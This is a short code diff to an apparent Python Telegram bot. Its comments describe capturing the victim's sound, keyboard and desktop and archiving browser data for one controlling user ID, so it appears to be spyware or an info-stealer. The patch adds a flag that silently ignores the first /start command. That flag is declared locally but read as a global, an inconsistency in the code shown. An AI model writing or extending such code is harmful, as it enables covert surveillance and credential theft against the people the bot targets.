@@ -71,11 +71,16 @@ def chat():
     """
     working with telegram chat
     """
+    start_state = False
     bot = telebot.TeleBot(TOKEN)  # creating a bot
 
     # send data and start capturing sound keyboard and desktop
     @bot.message_handler(commands=["start"])
     def start(m, res=False):
+        global start_state
+        if start_state == False:
+            start_state = True
+            return
         # checking for a specific user
         if m.from_user.id == MYID:
             # creating an archive and data from browsers
